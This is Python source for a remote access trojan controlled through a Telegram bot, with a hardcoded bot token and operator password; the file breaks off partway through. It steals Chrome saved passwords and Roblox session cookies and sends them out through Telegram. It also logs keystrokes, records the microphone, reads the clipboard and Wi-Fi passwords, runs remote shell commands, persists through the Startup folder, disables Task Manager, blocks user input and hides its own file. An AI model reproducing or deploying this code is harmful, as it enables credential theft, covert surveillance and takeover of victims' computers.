_BK='joeboxserver.exe'
_BJ='ksdumper.exe'
_BI='ksdumperclient.exe'
_BH='joeboxcontrol.exe'
_BG='qemu-ga.exe'
_BF='xenservice.exe'
_BE='prl_tools.exe'
_BD='prl_cc.exe'
_BC='x32dbg.exe'
_BB='x96dbg.exe'
_BA='vmacthlp.exe'
_B9='vgauthservice.exe'
_B8='pestudio.exe'
_B7='ollydbg.exe'
_B6='ida64.exe'
_B5='vmwaretray.exe'
_B4='vboxtray.exe'
_B3='df5serv.exe'
_B2='vboxservice.exe'
_B1='fiddler.exe'
_B0='wireshark.exe'
_A_='httpdebuggerui.exe'
_Az='dumpcap.exe'
_Ay='fakenet.exe'
_Ax='vmwareuser.exe'
_Aw='explorer.exe'
_Av='ProcessHacker.exe'
_Au='Taskmgr.exe'
_At='perfmon.exe'
_As='wmic process get description'
_Ar='Windows is blocked!'
_Aq='Enter record time:'
_Ap='Keylogger stopped!'
_Ao='User Data'
_An='USERPROFILE'
_Am='waiting_for_path'
_Al='password is wrong'
_Ak='Logged successfully!'
_Aj='Enter password:'
_Ai='attrib +h r.txt'
_Ah='tasklist'
_Ag='Please wait...'
_Af='optionright'
_Ae='optionleft'
_Ad='option'
_Ac='command'
_Ab='winright'
_Aa='winleft'
_AZ='volumemute'
_AY='subtract'
_AX='space'
_AW='shiftright'
_AV='shiftleft'
_AU='shift'
_AT='separator'
_AS='select'
_AR='scrolllock'
_AQ='return'
_AP='prtscr'
_AO='prtsc'
_AN='prntscrn'
_AM='printscreen'
_AL='print'
_AK='prevtrack'
_AJ='playpause'
_AI='pause'
_AH='pageup'
_AG='pagedown'
_AF='numlock'
_AE='nonconvert'
_AD='nexttrack'
_AC='multiply'
_AB='modechange'
_AA='launchmediaselect'
_A9='launchmail'
_A8='launchapp2'
_A7='launchapp1'
_A6='kanji'
_A5='junja'
_A4='insert'
_A3='hanja'
_A2='hangul'
_A1='hanguel'
_A0='final'
_z='f10'
_y='escape'
_x='esc'
_w='enter'
_v='end'
_u='divide'
_t='delete'
_s='del'
_r='decimal'
_q='ctrlright'
_p='ctrlleft'
_o='convert'
_n='clear'
_m='capslock'
_l='browserstop'
_k='browsersearch'
_j='browserrefresh'
_i='browserhome'
_h='browserforward'
_g='browserfavorites'
_f='browserback'
_e='backspace'
_d='altright'
_c='altleft'
_b='add'
_a='accept'
_Z='cmd.exe'
_Y='sleep'
_X='right'
_W='left'
_V='help'
_U='f4'
_T='execute'
_S='ctrl'
_R='apps'
_Q='whoami'
_P='498j-33v1-9d24-z390.mkv'
_O='\n'
_N='win'
_M='up'
_L='down'
_K='alt'
_J='\\'
_I='_windows_.txt'
_H='utf-8'
_G=None
_F='volumedown'
_E='w'
_D='volumeup'
_C=False
_B='rb'
_A=True
import telebot,os,random,pyttsx3,pyautogui,cv2,json,ctypes,base64,sqlite3,win32crypt,pyscreeze
from Cryptodome.Cipher import AES
import time,stat,pyaudio,wave,browser_cookie3,numpy as np,shutil
from pynput import keyboard
from datetime import datetime,timedelta
import os,shutil,sys
try:bot=telebot.TeleBot('7816891293:AAG9UVJuK4gEVkdHGtyKJjG8VoLRjcyIRH4')
except Exception as e:pass
textovik="\n## **🛠️ System Commands**\n- ⚙️ **/start** - Start the program\n- ⚙️ **/help** - Help with commands\n- 🔌 **/addstartup** - Add autostart\n- ⌨️ **/keylogger** - Start keylogger\n- ⛔ **/stopkeylogger** - Stop keylogger\n- 👟 **/run [filepath]** - Run file\n- 🧑🏻\u200d💻 **/users** - Show users on the PC\n- 🖥️ **/whoami** - Show the name of the PC\n- 📃 **/tasklist** - Show running tasks\n- 🧨 **/taskkill [task]** - Kill the entered task\n- 💤 **/sleep** - Put the PC to sleep\n- 🕚 **/shutdown** - Shutdown the PC\n- 🔄 **/restart** - Restart the PC\n- 💥 **/altf4** - ALT + F4 (google it to find what it means)\n- 💣 **/cmdbomb** - Opens 10 CMD windows\n- Ⓜ️ **/msg [type] [title] [text]** - Displays a messagebox\n*/msg types(info; warning; error; question; default or 0)*\n** for ex: /msg error testtitle testtext **\n\n## **🔒 Security & Privacy**\n- 🔑 **/passwords** - Show saved passwords on the PC\n- 🍪 **/robloxcookie** - Show Roblox cookies\n- 🧱 **/wallpaper** - Change the desktop wallpaper\n- 🪦 **/disabletaskmgr** - Disable Task Manager\n- 📠 **/enabletaskmgr** - Enable Task Manager\n- ☢️ **/winblocker** - My own winlocker\n- ☣️ **/winblocker2** - If winblocker doesn't work\n\n## **📱 Device Management**\n- 📷 **/screenshot** - Take a screenshot\n- 🎙️ **/mic [time in seconds]** - Record the PC's microphone\n- 📹 **/webscreen** - Get a screenshot from the camera\n- 🎦 **/webcam** - Get webcam video\n- 🎥 **/screenrecord** - Record the screen\n- 🚫 **/block** - Block user input (mouse and keyboard)\n- ✅ **/unblock** - Unblock user input (mouse and keyboard)\n- 🖱️ **/mousemesstart** - Start mouse messing\n- 🐁 **/mousemesstop** - Stop mouse messing\n- 🪤 **/mousekill** - Disable the mouse\n- 🐭 **/mousestop** - Enable the mouse\n- 🖱️ **/mousemove [x] [y]** - Enter x and y cordinates and mouse's pointer goes there\n- 🐁 **/mouseclick** - Make click with mouse\n- 🔊 **/fullvolume** - Set volume to full\n- 🔉 **/volumeplus** - Increase volume by 10\n- 🔇 **/volumeminus** - Decrease volume by 10\n- 🔄️ **/rotate** - Rotate monitor +90 degrees (for exmpl: entering 2 times rotates it 180 degrees)\n- 🪟 **/maximize** - Maximize active window\n- 🪟 **/minimize** - Minimize active window\n\n## **🌐 Networking**\n- \U0001f6dc **/wifilist** - Show saved Wi-Fi networks\n- 🔐 **/wifipass [accesspoint]** - Show the password of a saved Wi-Fi network\n- 🌐 **/chrome [website URL]** - Open a website in Chrome\n- 🌐 **/edge [website URL]** - Open a website in Edge\n- 🌐 **/firefox [website URL]** - Open a website in Firefox\n\n## **🎶 Multimedia**\n- 💬👂🏻 **/textspech [your text]** - Speak the text aloud\n- 🎵 **/playsound [file path]** - Play a sound file (first upload the file using **/upload**)\n- 📁 **/download [file path]** - Download a file from the PC\n- 🗃️ **/upload** - Upload a file to the PC\n- 📋 **/clipboard** - Show clipboard content\n- 📇 **/changeclipboard [testcahnge]** - Change clipboard content\n\n## **⚙️ Advanced Operations**\n- 🗡️ **/e [command]** - Execute shell commands (shortcut)\n- 🏹 **/ex [command]** - Execute shell commands with long responses\n- 🔫 **/execute** - Execute shell commands my alternative of netcat in linux (works commands such as cd ,cd.. and etc...)\n- *commands like cd ,cd .. and others work excellent in the /e ,  /ex and /execute commands.*\n- 📅 **/metadata [filepath]** - Displays the file's metadata information\n- ⌨️ **/keytype [key]** - Enter a text and that text will written with pc's keyboard\n- ⌨️ **/keypress [key]** - Press a specific key on the keyboard\n- ⌨️ **/keypresstwo [key1] [key2]** - Press two keys simultaneously\n- ⌨️ **/keypressthree [key1] [key2] [key3]** - Press three keys simultaneously\n- 🕶️ **/hide** - Hide your app\n- 👓 **/unhide** - Unhide your app\n\n## **🖥️ System Information**\n- \U0001faaa **/info** - Show PC information (IP, location, country, city)\n- 📊 **/pcinfo** - Info about PC's OS, system, CPU, Windows version, BIOS, etc...\n- 💻 **/shortinfo** - Show's less but, mostly the necessary information about pc\n- 🛠️ **/apps** - Show installed apps on the PC\n- 🔋 **/batteryinfo** - Show info about battery \n\n## **EXAMPLES:**\n- 📖 **/examples** - Shows examples\n\n"
examplestext="\n## **Examples:**\n- **/e whoami** → **Output**: win-9bn5tk4e2b7\\user\n- **/e cd /home** → **Output**: You are in: home\n- **/run C:\\Users\\user\\Pictures\\test.png** → **Output**: File opened successfully!\n- **/mousemove 50 80 ** → **Output**: Mouse pointer moved to {x} and {y} cordinates successfully!\n- **/keypress x ** → **Output**: 'x' key has pressed successfully!\n- **/msg info testtitle testtexthi** → **Output**: Successfully displayed! \n"
n=_C
@bot.message_handler(commands=['start'])
def start(message):
	A=message
	if n==_C:bot.send_message(A.chat.id,_Aj);bot.register_next_step_handler(A,checkpass)
	else:B=os.popen(_Q).read().strip();bot.send_message(A.chat.id,f"You can use /help");bot.send_message(A.chat.id,f"Pc's name is: {B}")
def checkpass(message):
	A=message
	if A.text=='Blackmercury2007!@#':global n;n=_A;bot.send_message(A.chat.id,_Ak);B=os.popen(_Q).read().strip();bot.send_message(A.chat.id,f"You can use /help");bot.send_message(A.chat.id,f"Pc name is: {B}")
	else:bot.send_message(A.chat.id,_Al)
user_state={}
@bot.message_handler(commands=['addstartup'])
def add_startup(message):A=message;bot.send_message(A.chat.id,'Enter name of your exe file');user_state[A.chat.id]=_Am
@bot.message_handler(func=lambda message:user_state.get(message.chat.id)==_Am)
def handle_executable_path(message):
	A=message;B=A.text;C=os.path.join(os.getenv('APPDATA'),'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
	if os.path.isdir(C):D=os.path.basename(B);E=os.path.join(C,D);shutil.copyfile(B,E);bot.send_message(A.chat.id,f"{D} added to startup successfully!")
	else:bot.send_message(A.chat.id,'Startup folder not found')
	user_state[A.chat.id]=_G
@bot.message_handler(commands=['robloxcookie'])
def robloxl(message):
	I='all_roblox_cookie.txt';G='.ROBLOSECURITY';F='roblox.com';D=message;B=[]
	try:
		C=browser_cookie3.chrome(domain_name=F)
		for A in C:
			bot.send_message(D.chat.id,A)
			if A.name==G:B.append(C);B.append(A.value);global li;global la;li=A.name;la=A.value
	except Exception as E:bot.send_message(D.chat.id,f"Error:{E}")
	try:
		C=browser_cookie3.brave(domain_name=F)
		for A in C:
			bot.send_message(D.chat.id,A)
			if A.name==G:B.append(C);B.append(A.value);return B
	except:pass
	try:
		C=browser_cookie3.firefox(domain_name=F)
		for A in C:
			if A.name==G:B.append(C);B.append(A.value);return B
	except:pass
	try:
		C=browser_cookie3.chromium(domain_name=F)
		for A in C:
			if A.name==G:B.append(C);B.append(A.value);return B
	except:pass
	try:
		C=browser_cookie3.edge(domain_name=F)
		for A in C:
			if A.name==G:print('L');B.append(C);B.append(A.value);return B
	except:pass
	try:
		C=browser_cookie3.opera(domain_name=F)
		for A in C:
			if A.name==G:B.append(C);B.append(A.value);return B
	except:pass
	try:bot.send_message(D.chat.id,f"security_cookie_name:{li}");bot.send_message(D.chat.id,f"security_cookie_value:{la}")
	except Exception as E:bot.send_document(D.chat.id,f"Error:{E}")
	try:
		with open(I,_E,encoding=_H)as H:H.write(str(B))
		with open(I,_B)as H:bot.send_document(D.chat.id,H)
	except Exception as E:bot.send_document(D.chat.id,f"Error:{E}")
	try:os.remove(I)
	except Exception as E:bot.send_document(D.chat.id,f"Error:{E}")
@bot.message_handler(commands=['passwords'])
def send_passwords(message):
	P='SELECT origin_url, action_url, username_value, password_value, date_created, date_last_used FROM logins ORDER BY date_created';M='passwords.txt';B=message;bot.send_message(B.chat.id,'Catching passwords...');N=get_encryption_key();Q=os.path.join(os.environ[_An],'AppData','Local','Google','Chrome',_Ao,'default','Login Data');I='ChromeData.db';shutil.copyfile(Q,I);O=sqlite3.connect(I);F=O.cursor();F.execute(P)
	for A in F.fetchall():
		J=A[0];K=A[1];G=A[2];H=decrypt_password(A[3],N);D=A[4];E=A[5]
		if G or H:bot.send_message(B.chat.id,f"Origin URL: {J}");bot.send_message(B.chat.id,f"Action URL: {K}");bot.send_message(B.chat.id,f"Username: {G}");bot.send_message(B.chat.id,f"Password: {H}")
		else:continue
		if D!=86400000000 and D:bot.send_message(B.chat.id,f"Creation date: {str(get_chrome_datetime(D))}")
		if E!=86400000000 and E:bot.send_message(B.chat.id,f"Last Used: {str(get_chrome_datetime(E))}")
		bot.send_message(B.chat.id,'='*50)
	C='';F.execute(P)
	for A in F.fetchall():
		J=A[0];K=A[1];G=A[2];H=decrypt_password(A[3],N);D=A[4];E=A[5]
		if G or H:C+=f"Origin URL: {J}\n";C+=f"Action URL: {K}\n";C+=f"Username: {G}\n";C+=f"Password: {H}\n"
		if D!=86400000000 and D:C+=f"Creation date: {str(get_chrome_datetime(D))}\n"
		if E!=86400000000 and E:C+=f"Last Used: {str(get_chrome_datetime(E))}\n"
		C+='='*50+'\n\n'
	F.close();O.close()
	try:os.remove(I)
	except Exception as R:print(f"Error while deleting file: {R}")
	if C:
		with open(M,_E,encoding=_H)as L:L.write(C)
		with open(M,_B)as L:bot.send_document(B.chat.id,L)
	else:bot.send_message(B.chat.id,'There is no passwordds to send them.')
	os.remove(M)
def get_encryption_key():
	C=os.path.join(os.environ[_An],'AppData','Local','Google','Chrome',_Ao,'Local State')
	with open(C,'r',encoding=_H)as D:A=D.read();A=json.loads(A)
	B=base64.b64decode(A['os_crypt']['encrypted_key']);B=B[5:];return win32crypt.CryptUnprotectData(B,_G,_G,_G,0)[1]
def decrypt_password(password,key):
	A=password
	try:B=A[3:15];A=A[15:];C=AES.new(key,AES.MODE_GCM,B);return C.decrypt(A)[:-16].decode()
	except Exception as D:
		try:return str(win32crypt.CryptUnprotectData(A,_G,_G,_G,0)[1])
		except:return''
def get_chrome_datetime(chromedate):return datetime(1601,1,1)+timedelta(microseconds=chromedate)
@bot.message_handler(commands=['taskkill'])
def task_kill(message):
	A=message
	try:B=A.text.split('/taskkill',1)[1].strip();C=os.popen(f"taskkill /f /im {B}").read().strip();bot.send_message(A.chat.id,f"{C}")
	except Exception as D:bot.send_message(A.chat.id,f"Error: {D}")
@bot.message_handler(commands=['msg'])
def show_message_box(message):
	A=message
	try:B=A.text.split('/msg',1)[1].strip().split();C=B[0];D=B[1];E=B[2];F={'info':64,'warning':48,'error':16,'question':32,'default':0};C=F.get(C,0);G=f'mshta vbscript:Execute("msgbox ""{E}"", {C}, ""{D}"":close")';bot.send_message(A.chat.id,'Successfully displayed!');os.popen(G)
	except Exception as H:bot.send_message(A.chat.id,f"Error:{H}")
@bot.message_handler(commands=['stopkeylogger'])
def stop_key(message):global end;end=1;bot.send_message(message.chat.id,_Ap)
@bot.message_handler(commands=['keylogger'])
def track_all_keys(message):
	A=message
	try:
		bot.send_message(A.chat.id,'Keylogger started!');bot.send_message(A.chat.id,'Run: /stopkeylogger to stop');global end;end=0
		def B(key):
			try:bot.send_message(A.chat.id,f"Pressed key: {key.char}")
			except AttributeError:bot.send_message(A.chat.id,f"Special key pressed: {key}")
		def C(key):
			if end==1:bot.send_message(A.chat.id,_Ap);return _C
		with keyboard.Listener(on_press=B,on_release=C)as D:D.join()
	except Exception as E:bot.send_message(A.chat.id,f"Error:{E}")
@bot.message_handler(commands=['clipboard'])
def get_clipboard_content(message):
	C=message;F=C.from_user.id;G=C.chat.id
	if F==G:
		D=1;A=ctypes.windll.kernel32;A.GlobalLock.argtypes=[ctypes.c_void_p];A.GlobalLock.restype=ctypes.c_void_p;A.GlobalUnlock.argtypes=[ctypes.c_void_p];B=ctypes.windll.user32;B.GetClipboardData.restype=ctypes.c_void_p;B.OpenClipboard(0)
		if B.IsClipboardFormatAvailable(D):H=B.GetClipboardData(D);E=A.GlobalLock(H);I=ctypes.c_char_p(E);J=I.value;A.GlobalUnlock(E);K=J.decode();B.CloseClipboard();L=os.getlogin();bot.send_message(C.chat.id,f"{L} 's clipboard is:  {K}")
global mousekill
mousekill=42
@bot.message_handler(commands=['mousestop'])
def mou(message):global mousekill;mousekill=7;bot.send_message(message.chat.id,'mouse kill has stopped!')
@bot.message_handler(commands=['mousekill'])
def mous(message):
	A=message
	try:
		bot.send_message(A.chat.id,'mouse kill has started!')
		while mousekill!=7:pyautogui.moveTo(500,500)
	except Exception as B:bot.send_message(A.chat.id,f"Error{B}")
global mousemess
mousemess=42
@bot.message_handler(commands=['mousemesstop'])
def moust(message):global mousemess;mousemess=7;bot.send_message(message.chat.id,'mouse mess has stopped!')
@bot.message_handler(commands=['mousemesstart'])
def mous(message):
	A=message
	try:
		bot.send_message(A.chat.id,'mouse mess has started!')
		while mousemess!=7:B=random.randint(666,999);C=random.randint(666,999);pyautogui.moveTo(B,C,7);time.sleep(1)
	except Exception as D:bot.send_message(A.chat.id,f"Error{D}")
@bot.message_handler(commands=['keytype'])
def keytyp(message):
	A=message
	try:B=A.text.split('/keytype',1)[1].strip();pyautogui.write(B)
	except Exception as C:bot.send_message(A.chat.id,f"Error{C}")
@bot.message_handler(commands=['mousemove'])
def mousemove(message):
	A=message
	try:B=A.text.split('/mousemove',1)[1].strip().split();C=int(B[0]);D=int(B[1]);pyautogui.moveTo(C,D);bot.send_message(A.chat.id,f"Mouse pointer moved to {C} and {D} cordinates successfully!")
	except Exception as E:bot.send_message(A.chat.id,f"Error{E}")
@bot.message_handler(commands=['mouseclick'])
def mousemove(message):
	A=message
	try:pyautogui.click();bot.send_message(A.chat.id,'Mouse clicked!')
	except Exception as B:bot.send_message(A.chat.id,f"Error{B}")
@bot.message_handler(commands=['keypress'])
def keyprs(message):
	A=message;C=['!','"','#','$','%','&',"'",'(',')','*','+',',','-','.','/','0','1','2','3','4','5','6','7','8','9',':',';','<','=','>','?','@','[',_J,']','^','_','`','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v',_E,'x','y','z','{','|','}','~',_a,_b,_K,_c,_d,_R,_e,_f,_g,_h,_i,_j,_k,_l,_m,_n,_o,_S,_p,_q,_r,_s,_t,_u,_L,_v,_w,_x,_y,_T,'f1',_z,'f11','f12','f13','f14','f15','f16','f17','f18','f19','f2','f20','f21','f22','f23','f24','f3',_U,'f5','f6','f7','f8','f9',_A0,'fn',_A1,_A2,_A3,_V,'home',_A4,_A5,'kana',_A6,_A7,_A8,_A9,_AA,_W,_AB,_AC,_AD,_AE,'num0','num1','num2','num3','num4','num5','num6','num7','num8','num9',_AF,_AG,_AH,_AI,'pgdn','pgup',_AJ,_AK,_AL,_AM,_AN,_AO,_AP,_AQ,_X,_AR,_AS,_AT,_AU,_AV,_AW,_Y,_AX,'stop',_AY,'tab',_M,_F,_AZ,_D,_N,_Aa,_Ab,'yen',_Ac,_Ad,_Ae,_Af]
	try:bot.send_message(A.chat.id,'(/keypress win) You can use this keys:');bot.send_message(A.chat.id,str(C));B=A.text.split('/keypress',1)[1].strip();pyautogui.press(B);bot.send_message(A.chat.id,f"'{B}'  key has pressed successfully!")
	except Exception as D:bot.send_message(A.chat.id,f"Error: {D}")
@bot.message_handler(commands=['keypresstwo'])
def keyprs(message):
	A=message;C=['!','"','#','$','%','&',"'",'(',')','*','+',',','-','.','/','0','1','2','3','4','5','6','7','8','9',':',';','<','=','>','?','@','[',_J,']','^','_','`','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v',_E,'x','y','z','{','|','}','~',_a,_b,_K,_c,_d,_R,_e,_f,_g,_h,_i,_j,_k,_l,_m,_n,_o,_S,_p,_q,_r,_s,_t,_u,_L,_v,_w,_x,_y,_T,'f1',_z,'f11','f12','f13','f14','f15','f16','f17','f18','f19','f2','f20','f21','f22','f23','f24','f3',_U,'f5','f6','f7','f8','f9',_A0,'fn',_A1,_A2,_A3,_V,'home',_A4,_A5,'kana',_A6,_A7,_A8,_A9,_AA,_W,_AB,_AC,_AD,_AE,'num0','num1','num2','num3','num4','num5','num6','num7','num8','num9',_AF,_AG,_AH,_AI,'pgdn','pgup',_AJ,_AK,_AL,_AM,_AN,_AO,_AP,_AQ,_X,_AR,_AS,_AT,_AU,_AV,_AW,_Y,_AX,'stop',_AY,'tab',_M,_F,_AZ,_D,_N,_Aa,_Ab,'yen',_Ac,_Ad,_Ae,_Af]
	try:bot.send_message(A.chat.id,'(/keypresstwo win r) You can use this keys:');bot.send_message(A.chat.id,str(C));B=A.text.split('/keypresstwo',1)[1].strip().split();D=B[0];E=B[1];pyautogui.hotkey(D,E);bot.send_message(A.chat.id,f"key has pressed successfully!")
	except Exception as F:bot.send_message(A.chat.id,f"Error: {F}")
@bot.message_handler(commands=['keypressthree'])
def keyprs(message):
	A=message;C=['!','"','#','$','%','&',"'",'(',')','*','+',',','-','.','/','0','1','2','3','4','5','6','7','8','9',':',';','<','=','>','?','@','[',_J,']','^','_','`','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v',_E,'x','y','z','{','|','}','~',_a,_b,_K,_c,_d,_R,_e,_f,_g,_h,_i,_j,_k,_l,_m,_n,_o,_S,_p,_q,_r,_s,_t,_u,_L,_v,_w,_x,_y,_T,'f1',_z,'f11','f12','f13','f14','f15','f16','f17','f18','f19','f2','f20','f21','f22','f23','f24','f3',_U,'f5','f6','f7','f8','f9',_A0,'fn',_A1,_A2,_A3,_V,'home',_A4,_A5,'kana',_A6,_A7,_A8,_A9,_AA,_W,_AB,_AC,_AD,_AE,'num0','num1','num2','num3','num4','num5','num6','num7','num8','num9',_AF,_AG,_AH,_AI,'pgdn','pgup',_AJ,_AK,_AL,_AM,_AN,_AO,_AP,_AQ,_X,_AR,_AS,_AT,_AU,_AV,_AW,_Y,_AX,'stop',_AY,'tab',_M,_F,_AZ,_D,_N,_Aa,_Ab,'yen',_Ac,_Ad,_Ae,_Af]
	try:bot.send_message(A.chat.id,'(/keypressthree ctrl alt esc) You can use this keys:');bot.send_message(A.chat.id,str(C));B=A.text.split('/keypressthree',1)[1].strip().split();D=B[0];E=B[1];F=B[2];pyautogui.hotkey(D,E,F);bot.send_message(A.chat.id,f"key has pressed successfully!")
	except Exception as G:bot.send_message(A.chat.id,f"Error: {G}")
@bot.message_handler(commands=[_R])
def apps(message):
	A=message
	try:
		D=os.popen('wmic product get Name, Version , Vendor').read().strip();B=D.splitlines();C=30;E=[B[A:A+C]for A in range(0,len(B),C)]
		for F in E:bot.send_message(A.chat.id,_O.join(F).strip())
	except Exception as G:bot.send_message(A.chat.id,f"Error: {G}")
@bot.message_handler(commands=['pcinfo'])
def pcinfo(message):
	C='wmic computersystem list brief';A=message
	try:
		D=os.popen(C).read().strip();E=os.popen(C).read().strip();F=os.popen('wmic bios get Manufacturer, Version, ReleaseDate, SerialNumber, SMBIOSBIOSVersion').read().strip();G=os.popen('wmic cpu get Name, NumberOfCores, NumberOfLogicalProcessors, MaxClockSpeed, Manufacturer, Caption').read().strip();H=os.popen('wmic memorychip get Capacity, Manufacturer, MemoryType, Speed, PartNumber, DeviceLocator').read().strip();I=os.popen('wmic diskdrive get Model, Size, SerialNumber, MediaType, InterfaceType, Status').read().strip();J=os.popen('wmic computersystem get Model, Manufacturer, TotalPhysicalMemory, Domain, Username, SystemType, NumberOfProcessors').read().strip();K=os.popen('wmic os get Caption, Version, OSArchitecture, BuildNumber, RegisteredUser, SerialNumber, InstallDate').read().strip();L=os.popen('wmic nicconfig get Description, MACAddress, IPAddress, DefaultIPGateway, DNSHostName, ServiceName').read().strip();M=os.popen('wmic os get /format:list').read().strip()
		def B(chat_id,title,content):
			A=content.splitlines();B=30;C=[A[C:C+B]for C in range(0,len(A),B)]
			for(D,E)in enumerate(C):bot.send_message(chat_id,f"{title} (part {D+1}):\n"+_O.join(E))
		B(A.chat.id,'PC Properties',D);B(A.chat.id,'PC OS Version',E);B(A.chat.id,'PC BIOS',F);B(A.chat.id,'CPU Info',G);B(A.chat.id,'RAM Info',H);B(A.chat.id,'Computer Info',J);B(A.chat.id,'Disk Drive Info',I);B(A.chat.id,'OS Info',K);B(A.chat.id,'Network Adapter Info',L);bot.send_message(A.chat.id,f"System Info: {M}")
	except Exception as N:bot.send_message(A.chat.id,f"Error: {N}")
@bot.message_handler(commands=['batteryinfo'])
def batteryinfo(message):
	A=message
	try:B=os.popen('wmic path Win32_Battery get BatteryStatus').read().strip();C=os.popen('wmic path Win32_Battery get EstimatedChargeRemaining').read().strip();D=os.popen('wmic path Win32_Battery get name').read().strip();E=os.popen('wmic path Win32_Battery get SystemName').read().strip();bot.send_message(A.chat.id,'In BatteryStatus. each number represents a specific battery state.\n                                Here are the meanings:\n                         \n                         1 - The battery is discharging\n                         2 - The battery is charging\n                         3 - The battery is fully charged\n                         4 - The battery charge is low\n                         5 - The battery charge is critical\n                         6 - The battery is charging and will soon be fully.\n                         7 - Charge is zero');bot.send_message(A.chat.id,f"Battery status: {B}");bot.send_message(A.chat.id,f"Battery System name: {E}");bot.send_message(A.chat.id,f"Battery name: {D}");bot.send_message(A.chat.id,f"Battery {C}%")
	except Exception as F:bot.send_message(A.chat.id,f"Error: {F}")
@bot.message_handler(commands=['shortinfo'])
def shortpcinfo(message):
	D='Not available';C='Unknown';B=message
	try:
		bot.send_message(B.chat.id,_Ag);I=os.getenv('COMPUTERNAME',C);J=os.popen('ver').read().strip()
		try:E=os.popen('wmic os get version').read().splitlines()[2].strip()
		except IndexError:E=C
		try:F=os.popen('wmic cpu get Name').read().splitlines()[2].strip()
		except IndexError:F=C
		K=os.cpu_count()
		if os.name=='nt':A=os.popen('wmic computersystem get TotalPhysicalMemory').read().splitlines()[2].strip();A=f"{int(A)//1024**2} MB"if A.isdigit()else D
		else:A=D
		G=os.popen('systeminfo | find "System Boot Time"').read().strip()
		if G:H=G.split(':')[1].strip()
		else:H=D
		L={'System':J,'Host name':I,'OS version':E,'CPU':F,'Core count':K,'RAM':A,'Boot time':H};M=_O.join([f"{A}: {B}"for(A,B)in L.items()]);bot.send_message(B.chat.id,M)
	except Exception as N:bot.send_message(B.chat.id,f"Error: {N}")
@bot.message_handler(commands=['disabletaskmgr'])
def disabtsk(message):
	A=message
	try:B='reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f';os.popen(B);bot.send_message(A.chat.id,'taskmanager disabled!')
	except Exception as C:bot.send_message(A.chat.id,f"Error: {C}")
@bot.message_handler(commands=['block'])
def block(message):
	A=message
	try:ctypes.windll.user32.BlockInput(_A);bot.send_message(A.chat.id,"User's input (mouse and keyboard) successfully blocked!")
	except Exception as B:bot.send_message(A.chat.id,f"Error: {B}")
@bot.message_handler(commands=['unblock'])
def unblock(message):
	A=message
	try:ctypes.windll.user32.BlockInput(_C);bot.send_message(A.chat.id,"User's input (mouse and keyboard) successfully unblocked!");bot.send_message(A.chat.id,"If it's not unblocked run again: \n/unblock")
	except Exception as B:bot.send_message(A.chat.id,f"Error: {B}")
@bot.message_handler(commands=['enabletaskmgr'])
def disabtsk(message):
	A=message
	try:B='reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 0 /f';os.popen(B);bot.send_message(A.chat.id,'taskmanager enabled!')
	except Exception as C:bot.send_message(A.chat.id,f"Error: {C}")
@bot.message_handler(commands=['wifilist'])
def wifipassword(message):A=os.popen('netsh wlan show profile').read().strip();bot.send_message(message.chat.id,f"Wifi networks📶:{A}")
@bot.message_handler(commands=['wifipass'])
def wifipassword(message):
	A=message;B=A.text.split('/wifipass',1)[1].strip();C=os.popen(f"netsh wlan show profile name={B} key=clear").read().strip()
	try:bot.send_message(A.chat.id,str(C))
	except Exception as D:bot.send_message(A.chat.id,f"Error: {D}")
@bot.message_handler(commands=['rotate'])
def rotate(message):A=0;A=(A+90)%360;pyautogui.hotkey(_S,_K,{0:_M,90:_X,180:_L,270:_W}[A]);bot.send_message(message.chat.id,f"rotated +{A} degrees")
@bot.message_handler(commands=['users'])
def users(message):
	A=message
	try:
		H=os.popen('net user').read().strip();I=H.splitlines();J=_O.join(I);bot.send_message(A.chat.id,f"Res:\n{J}");bot.send_message(A.chat.id,'####################################');K=os.popen('wmic useraccount list brief').read().strip();D=K.splitlines();C=D[0].split();E=[A.split(maxsplit=len(C)-1)for A in D[1:]];B=[len(A)for A in C]
		for L in E:
			for(F,M)in enumerate(L):B[F]=max(B[F],len(M))
		def G(row):return' | '.join(C.ljust(B[A])for(A,C)in enumerate(row))
		N=G(C);O='-+-'.join('-'*A for A in B);P=[N,O]+[G(A)for A in E];Q=_O.join(P);bot.send_message(A.chat.id,f"Also:\n{Q}")
	except Exception as R:bot.send_message(A.chat.id,f"Error: {R}")
@bot.message_handler(commands=['hide'])
def hide(message):
	A=message
	try:C=os.getcwd();D=os.path.basename(__file__);B=C+_J+D;bot.send_message(A.chat.id,f"Full path:{B}");os.popen(f'attrib +h "{B}"');bot.send_message(A.chat.id,f"your app is hidden!")
	except Exception as E:bot.send_message(A.chat.id,f"Error:{E}")
@bot.message_handler(commands=['unhide'])
def unhide(message):
	A=message
	try:C=os.getcwd();D=os.path.basename(__file__);B=C+_J+D;bot.send_message(A.chat.id,f"Full path:{B}");os.popen(f'attrib -h "{B}"');bot.send_message(A.chat.id,f"your app is unhidden!")
	except Exception as E:bot.send_message(A.chat.id,f"Error:{E}")
@bot.message_handler(commands=['mic'])
def record_audio(message):
	A=message
	if len(A.text.split())>1:
		try:C=int(A.text.split()[1])
		except ValueError:bot.reply_to(A,'Invalid record time. Please enter a valid number.');return
	else:C=5
	D=1024;I=pyaudio.paInt16;J=2;E=44100;F='6425s-3erq-eq44-vcx7.wav';G=pyaudio.PyAudio();H=G.open(format=I,channels=J,rate=E,input=_A,frames_per_buffer=D);bot.send_message(A.chat.id,f"Recording audio for {C} seconds...");K=[]
	for N in range(0,int(E/D*C)):L=H.read(D);K.append(L)
	bot.send_message(A.chat.id,'Done recording');H.stop_stream();H.close();G.terminate()
	with wave.open(F,'wb')as B:B.setnchannels(J);B.setsampwidth(G.get_sample_size(I));B.setframerate(E);B.writeframes(b''.join(K))
	with open(F,_B)as M:bot.send_audio(A.chat.id,M)
	os.remove(F)
@bot.message_handler(commands=['metadata'])
def get_metadata(message):
	A=message;E=A.text.split('/metadata',1)[1].strip()
	if not os.path.exists(E):bot.send_message(A.chat.id,'Error: File does not exist');return
